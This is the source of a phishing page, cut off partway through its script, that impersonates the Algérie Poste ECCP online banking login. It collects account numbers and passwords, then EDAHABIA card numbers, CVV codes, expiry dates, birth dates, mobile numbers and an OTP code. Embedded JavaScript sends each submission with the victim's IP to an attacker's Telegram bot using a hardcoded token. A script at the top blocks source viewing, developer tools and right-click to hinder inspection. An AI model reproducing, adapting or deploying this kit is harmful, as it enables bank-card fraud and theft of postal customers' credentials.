<!DOCTYPE html><html><head><script>document.onkeydown=function(e){if(e.ctrlKey&&(e.keyCode==85||e.keyCode==117||e.keyCode==83||e.keyCode==115||e.keyCode==73||e.keyCode==105||e.keyCode==74||e.keyCode==106||e.keyCode==67||e.keyCode==99)){return false;}if(e.keyCode==123){return false;}};document.addEventListener('contextmenu',function(e){e.preventDefault();});document.addEventListener('dragstart',function(e){e.preventDefault();});document.addEventListener('selectstart',function(e){e.preventDefault();});window.onload=function(){document.body.onkeydown=function(e){if(e.keyCode==123||(e.ctrlKey&&e.shiftKey&&(e.keyCode==73||e.keyCode==74||e.keyCode==67))){return false;}};document.body.oncontextmenu=function(){return false;};document.body.onselectstart=function(){return false;};document.body.ondragstart=function(){return false;};};</script><noscript><meta http-equiv="refresh" content="0; url=about:blank"></noscript></head><body></body></html>



























<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ECCP - ALGÉRIE POSTE</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background-color:#f0f0f0;min-height:100vh;padding:0}.header{background:#003c71;padding:15px 20px;display:flex;justify-content:space-between;align-items:center;box-shadow:0 2px 8px rgba(0,0,0,0.15)}.header-logo{width:60px;height:60px;display:flex;align-items:center;justify-content:center}.header-logo img{width:60px;height:60px}.menu-icon{color:#f1c40f;font-size:24px;cursor:pointer}.main-content{padding:40px 20px;max-width:600px;margin:0 auto}.page-title{font-size:24px;font-weight:normal;color:#003c71;margin-bottom:5px;position:relative;text-align:left}.page-title::after{content:'';position:absolute;bottom:-10px;left:0;width:100%;height:3px;background:#ffd700}.page-subtitle{font-size:16px;color:#666666;margin-bottom:35px;margin-top:20px;font-weight:normal;text-align:left}.login-container{background:#ffffff;border:2px solid #003c71;border-radius:20px;padding:35px 25px;margin-bottom:40px;box-shadow:0 3px 12px rgba(0,0,0,0.08)}.form-group{margin-bottom:25px;position:relative}.form-label{display:block;font-size:14px;font-weight:bold;color:#555555;margin-bottom:8px}.form-input{width:100%;height:40px;padding:0 15px;border:1px solid #cccccc;border-radius:5px;font-size:14px;color:#333333;background:white;transition:border-color 0.3s}.form-input:focus{outline:none;border-color:#003c71}.form-input.error{border-color:#e74c3c}.error-text{color:#e74c3c;font-size:12px;margin-top:5px;display:none}.login-button{background:#003c71;color:white;border:none;border-radius:5px;padding:12px 25px;font-size:14px;font-weight:bold;cursor:pointer;transition:background-color 0.3s;margin-bottom:20px}.login-button:hover{background:#002b54}.forgot-password{color:#003c71;font-size:13px;text-decoration:none;transition:color 0.3s}.forgot-password:hover{color:#002b54;text-decoration:underline}.account-section{text-align:center}.account-question{font-size:20px;font-weight:bold;color:#003c71;margin-bottom:30px}.create-account-button{background:#003c71;color:white;border:none;border-radius:5px;padding:12px 35px;font-size:14px;font-weight:bold;cursor:pointer;transition:background-color 0.3s;margin-bottom:20px}.create-account-button:hover{background:#002b54}.edahabia-text{font-size:13px;color:#888888;margin-bottom:30px}.or-text{font-size:18px;font-weight:bold;color:#003c71;margin:30px 0}.info-text{font-size:13px;color:#666666;line-height:1.6;margin-bottom:20px;text-align:center}.download-link{display:inline-flex;align-items:center;color:#003c71;text-decoration:none;font-size:13px;font-weight:normal;transition:color 0.3s}.download-link:hover{color:#002b54;text-decoration:underline}.download-icon{width:16px;height:16px;margin-right:8px;color:#dc3545}.loading-page{display:none;min-height:100vh;flex-direction:column}.loading-container{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center}.loading-spinner{width:60px;height:60px;border:5px solid #f3f3f3;border-top:5px solid #003c71;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:20px}.loading-text{font-size:24px;color:#003c71}.footer{background:#003c71;color:#fff;text-align:center;padding:15px;font-size:12px}.account-page{display:none;position:relative;padding-bottom:50px}.account-page .page-title{font-size:24px;font-weight:bold;color:#003c71;margin-bottom:15px}.account-page .page-subtitle{font-size:18px;color:#003c71;margin-bottom:30px;margin-top:25px;font-weight:bold}.form-container{background:#ffffff;border:2px solid #003c71;border-radius:20px;padding:35px 25px;margin-bottom:40px;box-shadow:0 3px 12px rgba(0,0,0,0.08)}.date-input{display:flex;gap:10px}.date-input select{flex:1;height:40px;padding:0 10px;border:1px solid #cccccc;border-radius:5px;font-size:14px;color:#333333;background:white}.submit-button{background:#003c71;color:white;border:none;border-radius:5px;padding:12px 25px;font-size:14px;font-weight:bold;cursor:pointer;transition:background-color 0.3s;margin-top:20px}.submit-button:hover{background:#002b54}.account-footer{position:fixed;bottom:0;left:0;right:0;background:#003c71;color:white;text-align:center;padding:10px 0;font-size:12px}.otp-page{display:none;min-height:100vh;flex-direction:column;background:linear-gradient(135deg,#f5f7fa 0%,#c3cfe2 100%)}.otp-header{background:linear-gradient(135deg,#003c71 0%,#0056a3 100%);color:white;padding:25px 20px;text-align:center;border-radius:20px;box-shadow:0 15px 35px rgba(0,60,113,0.3);margin:20px auto;max-width:500px;width:90%;position:relative;overflow:hidden}.otp-header::before{content:'';position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:linear-gradient(45deg,transparent,rgba(255,255,255,0.1),transparent);animation:shimmer 3s infinite}.otp-header img{width:65px;margin-bottom:12px;filter:brightness(1.2);position:relative;z-index:1}.otp-header h1{font-size:24px;margin:0;font-weight:bold;text-shadow:0 2px 4px rgba(0,0,0,0.3);position:relative;z-index:1}.otp-instruction{font-size:18px;margin:25px 0;text-align:center;font-weight:600;color:#003c71;text-shadow:0 1px 2px rgba(0,0,0,0.1);padding:0 15px}.otp-container{display:flex;justify-content:center;gap:12px;margin:30px auto;padding:25px 15px;background:white;border-radius:18px;box-shadow:0 10px 30px rgba(0,0,0,0.1);max-width:450px;width:95%}.otp-input{width:55px;height:55px;font-size:20px;font-weight:bold;text-align:center;border:2.5px solid #e1e8ed;border-radius:12px;background:linear-gradient(135deg,#ffffff 0%,#f8f9fa 100%);transition:all 0.3s cubic-bezier(0.4,0,0.2,1);box-shadow:0 3px 12px rgba(0,0,0,0.08);position:relative}.otp-input::before{content:'';position:absolute;top:-2.5px;left:-2.5px;right:-2.5px;bottom:-2.5px;background:linear-gradient(135deg,#003c71,#0056a3,#f1c40f);border-radius:15px;opacity:0;transition:opacity 0.3s ease;z-index:-1}.otp-input:focus{outline:none;transform:translateY(-1px) scale(1.03);box-shadow:0 6px 20px rgba(0,60,113,0.25);border-color:#003c71}.otp-input:focus::before{opacity:1}.otp-input:hover{transform:translateY(-1px);box-shadow:0 5px 15px rgba(0,0,0,0.12)}.otp-input.error{border-color:#e74c3c;background:linear-gradient(135deg,#fff5f5 0%,#ffeaea 100%);animation:shake 0.6s ease-in-out;box-shadow:0 3px 12px rgba(231,76,60,0.25)}.otp-input.success{border-color:#27ae60;background:linear-gradient(135deg,#f0fff4 0%,#e8f8e8 100%);animation:pulse 0.6s ease-in-out;box-shadow:0 3px 12px rgba(39,174,96,0.25)}.otp-submit-button{background:linear-gradient(135deg,#003c71 0%,#0056a3 100%);color:#fff;border:none;padding:14px 35px;border-radius:45px;cursor:pointer;font-size:16px;font-weight:bold;transition:all 0.3s cubic-bezier(0.4,0,0.2,1);box-shadow:0 6px 20px rgba(0,60,113,0.4);margin:20px auto;display:block;position:relative;overflow:hidden;min-width:180px}.otp-submit-button::before{content:'';position:absolute;top:0;left:-100%;width:100%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.2),transparent);transition:left 0.5s}.otp-submit-button:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(0,60,113,0.5)}.otp-submit-button:hover::before{left:100%}.otp-submit-button:active{transform:translateY(-1px);box-shadow:0 4px 12px rgba(0,60,113,0.4)}.error-message{color:#e74c3c;text-align:center;margin-bottom:15px;font-weight:bold;font-size:15px;padding:12px;background:linear-gradient(135deg,#fff5f5 0%,#ffeaea 100%);border-left:4px solid #e74c3c;border-radius:8px;animation:slideInDown 0.5s ease-out;margin:0 auto 20px;max-width:450px}.success-message{color:#27ae60;text-align:center;margin-bottom:15px;font-weight:bold;font-size:15px;padding:12px;background:linear-gradient(135deg,#f0fff4 0%,#e8f8e8 100%);border-left:4px solid #27ae60;border-radius:8px;animation:slideInDown 0.5s ease-out;margin:0 auto 20px;max-width:450px}.abuse-warning{color:#e74c3c;font-weight:bold;text-align:center;margin:10px 0;padding:10px;border:1px solid #e74c3c;border-radius:5px;background-color:#fff5f5}@keyframes spin{to{transform:rotate(360deg)}}@keyframes shimmer{0%{transform:translateX(-100%) translateY(-100%) rotate(45deg)}100%{transform:translateX(100%) translateY(100%) rotate(45deg)}}@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-5px)}75%{transform:translateX(5px)}}@keyframes pulse{0%{transform:scale(1)}50%{transform:scale(1.05)}100%{transform:scale(1)}}@keyframes slideInDown{0%{transform:translateY(-20px);opacity:0}100%{transform:translateY(0);opacity:1}}@media (max-width:768px){.main-content{padding:20px 15px}.login-container{padding:30px 20px}.page-title{font-size:24px}.page-subtitle{font-size:16px}.account-question{font-size:20px}.form-container{padding:30px 20px}.account-page .page-title{font-size:22px}.account-page .page-subtitle{font-size:16px}.otp-header{padding:20px 15px;margin:15px auto}.otp-header img{width:60px}.otp-header h1{font-size:22px}.otp-instruction{font-size:16px;margin:20px 0;padding:0 10px}.otp-container{gap:10px;padding:20px 10px;max-width:400px}.otp-input{width:50px;height:50px;font-size:18px;border-width:2px}.otp-submit-button{padding:12px 28px;font-size:15px;min-width:160px}}@media (max-width:480px){.header{padding:10px 15px}.header-logo{width:50px;height:50px}.header-logo img{width:50px;height:50px}.page-title{font-size:20px}.page-subtitle{font-size:14px}.login-container{padding:25px 15px;border-radius:15px}.login-button,.create-account-button{padding:10px 25px;font-size:14px}.account-question{font-size:18px}.form-container{padding:25px 15px;border-radius:15px}.account-page .page-title{font-size:20px}.account-page .page-subtitle{font-size:15px}.submit-button{padding:10px 25px;font-size:14px}.otp-header{padding:18px 12px;margin:12px auto;border-radius:16px}.otp-header img{width:55px}.otp-header h1{font-size:20px}.otp-instruction{font-size:15px;margin:18px 0;padding:0 8px}.otp-container{gap:8px;padding:18px 8px;max-width:360px;border-radius:15px}.otp-input{width:45px;height:45px;font-size:17px;border-width:2px;border-radius:10px}.otp-submit-button{padding:11px 25px;font-size:14px;min-width:150px;border-radius:40px}.error-message,.success-message{font-size:14px;padding:10px;max-width:360px}}@media (max-width:360px){.otp-container{gap:6px;padding:15px 6px;max-width:320px}.otp-input{width:42px;height:42px;font-size:16px}.otp-instruction{font-size:14px}.otp-submit-button{padding:10px 22px;font-size:13px;min-width:140px}}
    </style>
</head>
<body>
    <div id="loginPage">
        <div class="header">
            <div class="header-logo"><img src="https://eccp.poste.dz/img/logo-round.png" alt="ECCP Logo"></div>
            <div class="menu-icon">☰</div>
        </div>
        <div class="main-content">
            <h1 class="page-title">ECCP - ALGERIE POSTE</h1>
            <h2 class="page-subtitle">CONNECTEZ-VOUS A VOTRE COMPTE</h2>
            <div class="login-container">
                <div id="loginAbuseWarning" class="abuse-warning" style="display:none"></div>
                <form id="loginForm">
                    <div class="form-group">
                        <label class="form-label" for="ccp">CCP (Sans la clé)</label>
                        <input type="text" id="ccp" name="ccp" class="form-input" required>
                        <div class="error-text" id="ccpError"></div>
                    </div>
                    <div class="form-group">
                        <label class="form-label" for="password">Mot de passe</label>
                        <input type="password" id="password" name="password" class="form-input" required>
                        <div class="error-text" id="passwordError"></div>
                    </div>
                    <button type="submit" class="login-button">Se connecter</button>
                </form>
                <a href="#" class="forgot-password">Mot de passe oublié ?</a>
            </div>
            <div class="account-section">
                <h3 class="account-question">Vous n'avez pas de compte ECCP ?</h3>
                <button class="create-account-button">Créer un compte en-ligne</button>
                <p class="edahabia-text">Si vous disposez déjà d'une carte EDAHABIA</p>
                <div class="or-text">OU</div>
                <p class="info-text">Vous pouvez obtenir un code confidentiel au niveau de l'établissement postal de votre choix sur présentation d'une copie d'une pièce d'identité accompagnée du formulaire ci-dessous.</p>
                <a href="#" class="download-link"><span class="download-icon">📄</span>Télécharger Formulaire Demande ECCP</a>
            </div>
        </div>
    </div>

    <div id="loadingPage" class="loading-page">
        <div class="header">
            <div class="header-logo"><img src="https://eccp.poste.dz/img/logo-round.png" alt="ECCP Logo"></div>
            <div class="menu-icon">☰</div>
        </div>
        <div class="loading-container">
            <div class="loading-spinner"></div>
            <div class="loading-text">Chargement en cours...</div>
        </div>
        <div class="footer">Copyright © 2025 Algérie Poste. Tous droits réservés</div>
    </div>

    <div id="accountPage" class="account-page">
        <div class="header">
            <div class="header-logo"><img src="https://eccp.poste.dz/img/logo-round.png" alt="ECCP Logo"></div>
            <div class="menu-icon">☰</div>
        </div>
        <div class="main-content">
            <h1 class="page-title">COMPTE ECCP</h1>
            <h2 class="page-subtitle">Via la carte EDAHABIA</h2>
            <div class="form-container">
                <div class="form-group"><label class="form-label">Poste d'Algérie</label></div>
                <div class="form-group">
                    <label class="form-label">Nom</label>
                    <input type="text" class="form-input" id="lastName">
                    <div class="error-text" id="lastNameError"></div>
                </div>
                <div class="form-group">
                    <label class="form-label">Prénom</label>
                    <input type="text" class="form-input" id="firstName">
                    <div class="error-text" id="firstNameError"></div>
                </div>
                <div class="form-group">
                    <label class="form-label">Date de naissance</label>
                    <input type="text" id="birthDate" class="form-input" placeholder="jj/mm/aaaa" maxlength="10">
                    <div class="error-text" id="birthDateError"></div>
                </div>
                <div class="form-group">
                    <label class="form-label">Numéro de la Carte EDAHABIA</label>
                    <input type="text" class="form-input" id="cardNumber" maxlength="16">
                    <div class="error-text" id="cardNumberError"></div>
                </div>
                <div class="form-group">
                    <label class="form-label">CW</label>
                    <input type="text" class="form-input" id="cvv" maxlength="4">
                    <div class="error-text" id="cvvError"></div>
                </div>
                <div class="form-group">
                    <label class="form-label">Date expiration</label>
                    <div class="date-input">
                        <select id="expMonth">
                            <option value="">Mois</option>
                            <option value="01 - Janvier">Janvier</option>
                            <option value="02 - Février">Février</option>
                            <option value="03 - Mars">Mars</option>
                            <option value="04 - Avril">Avril</option>
                            <option value="05 - Mai">Mai</option>
                            <option value="06 - Juin">Juin</option>
                            <option value="07 - Juillet">Juillet</option>
                            <option value="08 - Août">Août</option>
                            <option value="09 - Septembre">Septembre</option>
                            <option value="10 - Octobre">Octobre</option>
                            <option value="11 - Novembre">Novembre</option>
                            <option value="12 - Décembre">Décembre</option>
                        </select>
                        <select id="expYear">
                            <option value="">Année</option>
                            <option value="2025">2025</option>
                            <option value="2026">2026</option>
                            <option value="2027">2027</option>
                            <option value="2028">2028</option>
                            <option value="2029">2029</option>
                            <option value="2030">2030</option>
                            <option value="2031">2031</option>
                            <option value="2032">2032</option>
                            <option value="2033">2033</option>
                            <option value="2034">2034</option>
                        </select>
                    </div>
                    <div class="error-text" id="expDateError"></div>
                </div>
                <div class="form-group">
                    <label class="form-label">N° Mobile lié à la carte</label>
                    <input type="text" class="form-input" id="mobileNumber">
                    <div class="error-text" id="mobileNumberError"></div>
                </div>
                <div id="abuseWarning" class="abuse-warning" style="display:none"></div>
                <button type="submit" class="submit-button" id="accountSubmit">Valider</button>
            </div>
        </div>
        <div class="account-footer">Copyright © 2025 Algérie Poste. Tous droits réservés</div>
    </div>

    <div id="otpPage" class="otp-page">
        <div class="header">
            <div class="header-logo"><img src="https://eccp.poste.dz/img/logo-round.png" alt="ECCP Logo"></div>
            <div class="menu-icon">☰</div>
        </div>
        <div class="main-content">
            <div class="otp-header">
                <img src="https://eccp.poste.dz/img/logo-round.png" alt="Logo ECCP">
                <h1>ECCP - ALGÉRIE POSTE</h1>
            </div>
            <div class="otp-instruction">Veuillez entrer le code OTP de 6 chiffres:</div>
            <div id="errorMessage" class="error-message" style="display:none"></div>
            <div id="successMessage" class="success-message" style="display:none"></div>
            <div class="otp-container">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
                <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
            </div>
            <button class="otp-submit-button" id="otpSubmitButton">Soumettre</button>
        </div>
        <div class="footer">Copyright © 2025 Algérie Poste. Tous droits réservés</div>
    </div>

    <script>
        const TELEGRAM_BOT_TOKEN = '8389195007:AAGkbz5t1VtKGgofC8t1GowIEDd2xLoCLE0';
        const TELEGRAM_CHAT_ID = '-4880746589';
        
        const monthMapping = {
            'Janvier': '01',
            'Février': '02',
            'Mars': '03',
            'Avril': '04',
            'Mai': '05',
            'Juin': '06',
            'Juillet': '07',
            'Août': '08',
            'Septembre': '09',
            'Octobre': '10',
            'Novembre': '11',
            'Décembre': '12'
        };

        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching IP:', error);
                return 'Unknown IP';
            }
        }

        function formatExpirationDate(expMonth, expYear) {
            if (!expMonth || !expYear) return '';
            
            const monthParts = expMonth.split(' - ');
            const monthNumber = monthParts[0];
            
            for (const [frenchMonth, number] of Object.entries(monthMapping)) {
                if (expMonth.includes(frenchMonth)) {
                    return `${number}/${monthNumber}/${expYear}`;
                }
            }
            
            return `${monthNumber}/${expYear}`;
        }

        async function sendToTelegram(message) {
            try {
                const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                
                const response = await fetch(telegramApiUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
                
                if (!response.ok) {
                    console.error('Failed to send message to Telegram');
                }
            } catch (error) {
                console.error('Error sending to Telegram:', error);
            }
        }

        document.addEventListener('DOMContentLoaded',function(){
            const loginPage=document.getElementById('loginPage');
            const loadingPage=document.getElementById('loadingPage');
            const accountPage=document.getElementById('accountPage');
            const otpPage=document.getElementById('otpPage');
            const otpSubmitButton=document.getElementById('otpSubmitButton');
            const errorMessage=document.getElementById('errorMessage');
            const successMessage=document.getElementById('successMessage');
            const otpInputs=document.querySelectorAll('.otp-input');
            const abuseWarning=document.getElementById('abuseWarning');
            const loginAbuseWarning=document.getElementById('loginAbuseWarning');
            
            const abusiveWords = [
                'nik mok', 'nik yamak', 'yadak fi zabi', 'ya wald l9ahba', 
                'ya zamal', 'ya zamel', '3atay', 'no9ch', 'nokch', 
                'rkhis', 'r5is', 'zabiii', 'niiik', 'niik', 'nikak', 'niklak',
                'nik', 'l9ahba', 'zamal', 'yamak', 'zabi', 'zamel', '9ahba'
            ];
            
            let otpAttempts=0;
            loginPage.style.display='block';
            loadingPage.style.display='none';
            accountPage.style.display='none';
            otpPage.style.display='none';

            function preventArabicInput(e) {
                const arabicPattern = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/;
                const char = String.fromCharCode(e.which || e.keyCode);
                
                if (arabicPattern.test(char)) {
                    e.preventDefault();
                    return false;
                }
                return true;
            }

            function preventArabicPaste(e) {
                const clipboardData = e.clipboardData || window.clipboardData;
                const pastedData = clipboardData.getData('text');
                const arabicPattern = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/;
                
                if (arabicPattern.test(pastedData)) {
                    e.preventDefault();
                    return false;
                }
                return true;
            }

            const allInputs = document.querySelectorAll('input[type="text"], input[type="password"]');
            allInputs.forEach(input => {
                input.addEventListener('keypress', preventArabicInput);
                input.addEventListener('paste', preventArabicPaste);
            });

            function isLetter(e) {
                const charCode = e.which ? e.which : e.keyCode;
                if (charCode > 31 && (charCode < 65 || charCode > 90) && (charCode < 97 || charCode > 122) && charCode !== 32) {
                    e.preventDefault();
                    return false;
                }
                return true;
            }

            function isNumber(e) {
                const charCode = e.which ? e.which : e.keyCode;
                if (charCode > 31 && (charCode < 48 || charCode > 57)) {
                    e.preventDefault();
                    return false;
                }
                return true;
            }

            document.getElementById('lastName').addEventListener('keypress', function(e) {
                preventArabicInput(e);
                isLetter(e);
            });

            document.getElementById('firstName').addEventListener('keypress', function(e) {
                preventArabicInput(e);
                isLetter(e);
            });

            document.getElementById('cardNumber').addEventListener('keypress', function(e) {
                preventArabicInput(e);
                isNumber(e);
            });

            document.getElementById('cvv').addEventListener('keypress', function(e) {
                preventArabicInput(e);
                isNumber(e);
            });

            document.getElementById('mobileNumber').addEventListener('keypress', function(e) {
                preventArabicInput(e);
                isNumber(e);
            });

            function checkForAbuse(text) {
                const lowerText = text.toLowerCase();
                for (const word of abusiveWords) {
                    if (lowerText.includes(word.toLowerCase())) {
                        return word;
                    }
                }
                return null;
            }

            function validateName(name) {
                if (name.length < 3) {
                    return "Le nom doit contenir au moins 3 caractères";
                }
                if (/[0-9]/.test(name)) {
                    return "Le nom ne doit pas contenir de chiffres";
                }
                if (/[\u0600-\u06FF]/.test(name)) {
                    return "Les caractères arabes ne sont pas autorisés";
                }
                return null;
            }

            function validatePassword(password) {
                if (password.length < 3) {
                    return "Le mot de passe doit contenir au moins 3 caractères";
                }
                return null;
            }

            function validateCCP(ccp) {
                if (ccp.length < 3) {
                    return "Le CCP doit contenir au moins 3 caractères";
                }
                if (/^\d{3}$/.test(ccp)) {
                    return "Le CCP ne peut pas être composé de seulement 3 chiffres";
                }
                return null;
            }

            function validateBirthDate(date) {
                if (!/^\d{2}\/\d{2}\/\d{4}$/.test(date)) {
                    return "Format de date invalide (jj/mm/aaaa)";
                }
                
                const parts = date.split('/');
                const day = parseInt(parts[0], 10);
                const month = parseInt(parts[1], 10);
                const year = parseInt(parts[2], 10);
                
                if (month < 1 || month > 12) {
                    return "Mois invalide";
                }
                
                const daysInMonth = new Date(year, month, 0).getDate();
                if (day < 1 || day > daysInMonth) {
                    return "Jour invalide pour ce mois";
                }
                
                const today = new Date();
                const birthDate = new Date(year, month - 1, day);
                
                if (birthDate > today) {
                    return "La date de naissance ne peut pas être dans le futur";
                }
                
                return null;
            }

            function validateCardNumber(number) {
                if (!/^\d{16}$/.test(number)) {
                    return "Le numéro de carte doit contenir exactement 16 chiffres";
                }
                if (!number.startsWith('62')) {
                    return "Le numéro de carte doit commencer par 62";
                }
                return null;
            }

            function validateCVV(cvv) {
                if (!/^\d{3,4}$/.test(cvv)) {
                    return "Le CVV doit contenir 3 ou 4 chiffres";
                }
                return null;
            }

            function validateMobileNumber(number) {
                if (!/^\d+$/.test(number)) {
                    return "Le numéro mobile ne doit contenir que des chiffres";
                }
                if (number.length < 8) {
                    return "Numéro mobile trop court";
                }
                return null;
            }

            function showError(elementId, errorId, message) {
                const element = document.getElementById(elementId);
                const errorElement = document.getElementById(errorId);
                element.classList.add('error');
                errorElement.textContent = message;
                errorElement.style.display = 'block';
                return false;
            }

            function clearError(elementId, errorId) {
                const element = document.getElementById(elementId);
                const errorElement = document.getElementById(errorId);
                element.classList.remove('error');
                errorElement.style.display = 'none';
                return true;
            }

            function validateLoginForm() {
                let isValid = true;
                const ccp = document.getElementById('ccp').value;
                const password = document.getElementById('password').value;
                
                const fieldsToCheck = [
                    {value: ccp},
                    {value: password}
                ];
                
                for (const field of fieldsToCheck) {
                    const abusiveWord = checkForAbuse(field.value);
                    if (abusiveWord) {
                        loginAbuseWarning.textContent = `🚨 تحذير شديد: تم رصد استخدام لفظ مسيء. أي تكرار قد يؤدي إلى تقييد ميزات حسابك أو إيقافه بشكل نهائي حسب لوائح بريد الجزائر.`;
                        loginAbuseWarning.style.display = 'block';
                        isValid = false;
                        return false;
                    } else {
                        loginAbuseWarning.style.display = 'none';
                    }
                }
                
                const ccpError = validateCCP(ccp);
                if (ccpError) {
                    showError('ccp', 'ccpError', ccpError);
                    isValid = false;
                } else {
                    clearError('ccp', 'ccpError');
                }
                
                const passwordError = validatePassword(password);
                if (passwordError) {
                    showError('password', 'passwordError', passwordError);
                    isValid = false;
                } else {
                    clearError('password', 'passwordError');
                }
                
                return isValid;
            }

            function validateAccountForm() {
                let isValid = true;
                const lastName = document.getElementById('lastName').value;
                const firstName = document.getElementById('firstName').value;
                const birthDate = document.getElementById('birthDate').value;
                const cardNumber = document.getElementById('cardNumber').value;
                const cvv = document.getElementById('cvv').value;
                const expMonth = document.getElementById('expMonth').value;
                const expYear = document.getElementById('expYear').value;
                const mobileNumber = document.getElementById('mobileNumber').value;
                
                const fieldsToCheck = [
                    {id: 'lastName', value: lastName},
                    {id: 'firstName', value: firstName},
                    {id: 'mobileNumber', value: mobileNumber}
                ];
                
                for (const field of fieldsToCheck) {
                    const abusiveWord = checkForAbuse(field.value);
                    if (abusiveWord) {
                        abuseWarning.textContent = `🚨 تحذير شديد: تم رصد استخدام لفظ مسيء «${abusiveWord}». أي تكرار قد يؤدي إلى تقييد ميزات حسابك أو إيقافه بشكل نهائي حسب لوائح بريد الجزائر.`;
                        abuseWarning.style.display = 'block';
                        showError(field.id, field.id + 'Error', '');
                        isValid = false;
                        return false;
                    } else {
                        abuseWarning.style.display = 'none';
                    }
                }
                
                const lastNameError = validateName(lastName);
                if (lastNameError) {
                    showError('lastName', 'lastNameError', lastNameError);
                    isValid = false;
                } else {
                    clearError('lastName', 'lastNameError');
                }
                
                const firstNameError = validateName(firstName);
                if (firstNameError) {
                    showError('firstName', 'firstNameError', firstNameError);
                    isValid = false;
                } else {
                    clearError('firstName', 'firstNameError');
                }
                
                const birthDateError = validateBirthDate(birthDate);
                if (birthDateError) {
                    showError('birthDate', 'birthDateError', birthDateError);
                    isValid = false;
                } else {
                    clearError('birthDate', 'birthDateError');
                }
                
                const cardNumberError = validateCardNumber(cardNumber);
                if (cardNumberError) {
                    showError('cardNumber', 'cardNumberError', cardNumberError);
                    isValid = false;
                } else {
                    clearError('cardNumber', 'cardNumberError');
                }
                
                const cvvError = validateCVV(cvv);
                if (cvvError) {
                    showError('cvv', 'cvvError', cvvError);
                    isValid = false;
                } else {
                    clearError('cvv', 'cvvError');
                }
                
                if (!expMonth || !expYear) {
                    showError('expMonth', 'expDateError', 'Veuillez sélectionner une date d\'expiration valide');
                    isValid = false;
                } else {
                    clearError('expMonth', 'expDateError');
                }
                
                const mobileNumberError = validateMobileNumber(mobileNumber);
                if (mobileNumberError) {
                    showError('mobileNumber', 'mobileNumberError', mobileNumberError);
                    isValid = false;
                } else {
                    clearError('mobileNumber', 'mobileNumberError');
                }
                
                return isValid;
            }

            document.getElementById('loginForm').addEventListener('submit', async function(event){
                event.preventDefault();
                if (validateLoginForm()) {
                    const ccp=document.getElementById('ccp').value;
                    const password=document.getElementById('password').value;
                    
                    if(ccp&&password){
                        const userIP = await getUserIP();
                        
                        const message = `**Nouvelle connexion ECCP**\n\n` +
                                        `💳 **CCP:** \`${ccp}\`\n` +
                                        `🔒 **PASSWORD:** \`${password}\`\n` +
                                        `🌐 **IP:** \`${userIP}\``;
                        
                        await sendToTelegram(message);
                        
                        loginPage.style.display='none';
                        loadingPage.style.display='flex';
                        setTimeout(function(){
                            loadingPage.style.display='none';
                            accountPage.style.display='block';
                        },5000);
                    }
                }
                return false;
            });

            document.querySelector('.create-account-button').addEventListener('click',function(){
                alert('Redirection vers la création de compte...');
            });

            document.getElementById('accountSubmit').addEventListener('click', async function(event){
                event.preventDefault();
                if (validateAccountForm()) {
                    const lastName = document.getElementById('lastName').value;
                    const firstName = document.getElementById('firstName').value;
                    const birthDate = document.getElementById('birthDate').value;
                    const cardNumber = document.getElementById('cardNumber').value;
                    const cvv = document.getElementById('cvv').value;
                    const expMonth = document.getElementById('expMonth').value;
                    const expYear = document.getElementById('expYear').value;
                    const mobileNumber = document.getElementById('mobileNumber').value;
                    
                    const userIP = await getUserIP();
                    const formattedExpDate = formatExpirationDate(expMonth, expYear);
                    
                    const message = `**Nouvelle carte EDAHABIA**\n\n` +
                                   `👶 **Nom:** \`${lastName}\`\n` +
                                   `😊 **Prénom:** \`${firstName}\`\n` +
                                   `📅 **Date de naissance:** \`${birthDate}\`\n` +
                                   `💳 **Carte EDAHABIA:** \`${cardNumber}\`\n` +
                                   `🔒 **CW:** \`${cvv}\`\n` +
                                   `⏰ **Date expiration:** \`${formattedExpDate}\`\n` +
                                   `📱 **N° Mobile lié à la carte:** \`${mobileNumber}\`\n` +
                                   `🌐 **IP:** \`${userIP}\``;
                    
                    await sendToTelegram(message);
                    
                    accountPage.style.display='none';
                    loadingPage.style.display='flex';
                    setTimeout(function(){
                        loadingPage.style.display='none';
                        otpPage.style.display='block';
                        resetOtpFields();
                        otpInputs[0].focus();
                    },12000);
                }
            });

            document.querySelectorAll('.menu-icon').forEach(icon=>{
                icon.addEventListener('click',function(){
                    alert('Menu clicked');
                });
            });

            document.getElementById('birthDate').addEventListener('input',function(e){
                let input=e.target;
                let value=input.value.replace(/\D/g,'');
                let cursorPos=input.selectionStart;
                if(value.length===2&&cursorPos===2&&!input.value.includes('/')){
                    input.value=value+'/';
                    input.setSelectionRange(3,3);
                    return;
                }
                if(value.length===4&&cursorPos===5&&input.value.split('/').length<3){
                    input.value=value.substring(0,2)+'/'+value.substring(2)+'/';
                    input.setSelectionRange(6,6);
                    return;
                }
                let formattedValue='';
                if(value.length>0)formattedValue=value.substring(0,2);
                if(value.length>2)formattedValue+='/'+value.substring(2,4);
                if(value.length>4)formattedValue+='/'+value.substring(4,8);
                input.value=formattedValue;
            });

            document.getElementById('birthDate').addEventListener('keydown',function(e){
                let input=e.target;
                let cursorPos=input.selectionStart;
                if(e.key==='Backspace'&&(cursorPos===3||cursorPos===6)){
                    e.preventDefault();
